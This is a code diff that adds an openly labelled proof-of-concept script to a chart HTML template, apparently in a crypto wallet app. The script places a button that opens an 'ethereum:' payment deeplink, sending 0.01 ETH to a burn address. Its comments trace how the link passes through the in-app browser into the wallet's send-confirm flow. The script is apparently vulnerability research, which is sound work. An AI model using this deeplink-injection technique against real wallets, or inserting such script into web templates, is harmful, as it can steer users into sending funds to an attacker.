@@ -353,6 +353,60 @@ export const createAdvancedChartTemplate = (
     <script type="text/javascript">
         ${chartLogicScript}
     </script>
+    <!-- BEGIN THREAT3 POC (remove me) -->
+    <script type="text/javascript">
+      (function mountThreat3Poc() {
+        var ATTACKER_DEEPLINK =
+          'ethereum:0x000000000000000000000000000000000000dEaD@1?value=1e16';
+
+        function mount() {
+          if (document.getElementById('threat3-poc-root')) return;
+
+          var root = document.createElement('div');
+          root.id = 'threat3-poc-root';
+          root.style.cssText =
+            'position:fixed;top:8px;left:8px;z-index:2147483647;' +
+            'display:flex;flex-direction:column;gap:6px;' +
+            'font-family:-apple-system,Roboto,sans-serif;';
+
+          // Exploit button: fires window.open('ethereum:...') -> native
+          // onOpenWindow -> handleTradingViewOpen -> openInAppBrowser -> OS
+          // re-enters MetaMask deeplink router -> Send/confirm to attacker.
+          var attack = document.createElement('button');
+          attack.textContent = '\u26A0\uFE0F PoC: send 0.01 ETH';
+          attack.style.cssText =
+            'padding:10px 14px;background:#d32f2f;color:#fff;border:none;' +
+            'border-radius:8px;font-size:14px;font-weight:700;' +
+            'box-shadow:0 2px 8px rgba(0,0,0,0.4);';
+          attack.onclick = function onAttack() {
+            window.open(ATTACKER_DEEPLINK);
+          };
+
+          // Negative control: window.location assignment. Expected to do
+          // nothing (the app-level navigation vector is not the active sink).
+          var control = document.createElement('button');
+          control.textContent = 'control (should do nothing)';
+          control.style.cssText =
+            'padding:10px 14px;background:#9e9e9e;color:#fff;border:none;' +
+            'border-radius:8px;font-size:13px;font-weight:600;' +
+            'box-shadow:0 2px 8px rgba(0,0,0,0.4);';
+          control.onclick = function onControl() {
+            window.location = ATTACKER_DEEPLINK;
+          };
+
+          root.appendChild(attack);
+          root.appendChild(control);
+          document.body.appendChild(root);
+        }
+
+        if (document.body) {
+          mount();
+        } else {
+          document.addEventListener('DOMContentLoaded', mount);
+        }
+      })();
+    </script>
+    <!-- END THREAT3 POC -->
 </body>
 </html>
 `;
